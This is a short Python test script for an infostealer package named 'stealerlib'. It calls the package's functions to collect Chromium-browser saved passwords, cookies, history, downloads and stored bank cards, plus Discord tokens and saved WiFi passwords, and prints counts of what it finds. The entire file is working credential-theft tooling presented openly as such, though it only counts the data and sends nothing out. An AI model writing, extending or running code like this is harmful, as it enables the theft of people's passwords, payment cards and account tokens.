#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: count_test.py
"""

from stealerlib.wifi import WiFi
from stealerlib.discord import Discord
from stealerlib.browser import Browser


if __name__ == '__main__':
    browser = Browser()
    network = WiFi()
    discord = Discord()

    passwords = browser.get_passwords(type='chromium')
    print(f"Found {len(passwords[0])} browser passwords\n")

    cookies = browser.get_cookies(type='chromium')
    print(f"Found {len(cookies[0])} browser cookies\n")

    history = browser.get_history(type='chromium')
    print(f"Found {len(history[0])} browser history logs\n")

    downloads = browser.get_downloads(type='chromium')
    print(f"Found {len(downloads[0])} browser download logs\n")

    cards = browser.get_cards(type='chromium')
    print(f"Found {len(cards[0])} browser bank cards\n")

    discord.get_tokens()
    print(f"Found {len(discord.tokens)} discord tokens\n")

    network.get_wifi_passwords()
    print(f"Found {len(network.credentials)} WiFi passwords\n")